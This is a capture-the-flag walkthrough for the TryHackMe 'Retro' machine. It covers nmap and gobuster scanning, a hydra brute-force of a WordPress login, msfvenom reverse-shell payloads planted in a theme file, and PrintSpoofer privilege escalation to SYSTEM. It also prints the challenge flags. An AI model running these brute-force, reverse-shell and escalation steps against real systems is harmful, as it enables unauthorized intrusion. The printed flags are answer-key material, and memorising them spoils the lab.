
# Tryhackme | Retro

### Description
```
Can you time travel? If not, you might want to think about the next best thing. 


Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.
```

### Nmap scan


#####  SYN/ACK scan on all ports with OS and services version detection

```bash
nmap -sS -sV -p- -O <TARGET IP>

Nmap scan report for <TARGET IP>
Host is up (0.049s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```



### Files and directories enumeration

Let's run gubuster scan to explore content of this site

```bash
gobuster dir -x html,js,php,txt,aspx -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url http://<TARGET IP>


===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://<TARGET IP>
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              html,js,php,txt,aspx
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/retro                (Status: 301) [Size: 148] [--> http://<TARGET IP>/retro/]
```


## Question 1
> **A web server is running on the target. What is the hidden directory which the website lives on?**
> **/retro**



### Manual site enumeration

Exploring posts on this Wordpress site we can find account with username Wade.  

Exploring further we can see that there is Wordpress's default login page on **/retro/wp-login.php**


Let's generate dictionary based on this site's content

```bash
cewl --meta -d 2 http://<TARGET IP>/retro -w wordlist.txt
```


With this dictionary we can try to log in into admin panel

```bash
hydra -L wordlist.txt -P wordlist.txt <TARGET IP> http-post-form "/retro/wp-login.php:log=^USER^&pwd=^PASS^:F=Lost your password?" -s 80

[80][http-post-form] host: <TARGET IP>   login: Wade   password: parzival
```

We can succesfuly login into wp-admin using credentails cracked by hydra
> Login: **Wade** 
> Pass: **parzival**




### Exploring wp-admin

Luckily, Wade is administrator and can edit themes files. We'll try to get shell from there.


## Genereate and upload payload

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=<LOCAL IP> LPORT=53 -f raw > shell.php
```


Open one of theme's file and replace all content with your payload. _In my case it is comments.php_


#### Start listener

```
msfconsole

msf6 > use multi/handler
msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
```

**Now change listener options and run it**

```bash
set LHOST <LOCAL IP>
set LPORT 53

run
```

### Call shell loading malicious php file

Since I've pasted my shell into comments.php file, I have to visit page which displays comment and allow to post them. I can open one of Wade's posts and get shell


**Response from msfconsole**

```bash
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on <LOCAL IP>:53 
[*] Sending stage (39927 bytes) to <TARGET IP>
[*] Meterpreter session 1 opened (<LOACAL IP>:53 -> <TARGET IP>:51078)

meterpreter > 
```

We've reverse shell connection. From there I suggest you to upload .exe shell which is more stable. Let's generate new payload


### Shell stabilisation

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL IP> LPORT=666 -f exe > win_shell.exe
```

In msfconsole, move to directory where you have write permissions and upload your shell.

```batch
cd C:\Users\All Users
upload shell.exe
```


Open new msfconsole, **use multi/handler** and **set payload windows/meterpreter/reverse_tcp**


```bash
msf6 > use multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
```

> Remember to set LPORT and LHOST


Run listener and then execute shell.exe on previous meterpreter

```bash
meterpreter > execute -f "win_shell.exe" -H
```

### Privilege escalation

Now in our new meterpreter connection we can search for post metasploit post modules to enumerate further. We are looking for possible exploits


```bash
meterpreter > bg
msf6 exploit(multi/handler) > search type:post platform:windows
msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
run
```

Unfortunately this script didn't find anything useful.  
Let's run **systeminfo** and **whoami /priv** command. Information we get will be useful to perform privellege escalation attack.

Go back to your session  

```bash
msf6 post(multi/recon/local_exploit_suggester) > session -i 1
```


```batch
C:\Users\All Users>systeminfo             
systeminfo

Host Name:                 RETROWEB
OS Name:                   Microsoft Windows Server 2016 Standard
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
```



```batch
C:\Users\All Users>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

### Exploiting

Let's look closer at **SeImpersonatePrivilege**


On [hacktricks.xyz](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#seimpersonateprivilege-3.1.1) we can learn that we are able to abuse this privelege and get SYSTEM permissions.


Download [Print spoofer](https://github.com/itm4n/PrintSpoofer) and upload it to target machine.



```bash
meterpreter > upload PrintSpoofer32.exe
meterpreter > shell
C:\Users\All Users>PrintSpoofer32.exe -i -c cmd


[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```


We've got elevated privelleges!

Now we can lurk for user.txt and root.txt file. After some looking we find out that these files are in Wade's and Administrator's desktops. Contents of these files are our flags.

## Question 2
> **user.txt**
> **3b99fbdc6d430bfb51c72c651a261927**

## Question 3
> **root.txt**
> **7958b569565d7bd88d10c6f22d1c4063**
